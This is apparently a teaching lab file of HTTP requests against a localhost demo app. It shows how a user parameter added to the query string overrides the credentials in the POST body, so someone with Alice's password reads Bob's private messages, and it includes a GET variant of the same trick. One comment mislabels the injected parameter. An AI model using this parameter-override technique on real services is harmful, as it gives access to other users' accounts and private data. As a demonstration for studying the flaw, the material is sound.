@base = http://localhost:8000/ii/source-precedence
# Regular requests would pass credentials solely via POST body:
POST {{base}}/example6
Content-Type: application/x-www-form-urlencoded

user=alice&password=123456

# And as usual, Alice would get her *own* messages:
#
# [
#  {
#    "from": "kevin",
#    "message": "Hi Alice, you're fired!"
#  }
# ]
#

###

# Attacker can get Alice's messages by adding user=alice to the query string:
POST {{base}}/example6?user=bob
Content-Type: application/x-www-form-urlencoded

user=alice&password=123456
###

# Notably, attack works even with the GET request, assuming it's enabled:
GET {{base}}/example6?user=bob
Content-Type: application/x-www-form-urlencoded

user=alice&password=123456

# Alice gets Bob's messages, even though she provided her own password!
#
# [
#  {
#    "from": "kevin",
#    "message": "Hi Bob, here is the password you asked for: P@ssw0rd!"
#  },
#  {
#    "from": "michael",
#    "message": "Hi Bob, come to my party on Friday! The secret passphrase is 'no-one-knows-it'!"
#  }
# ]
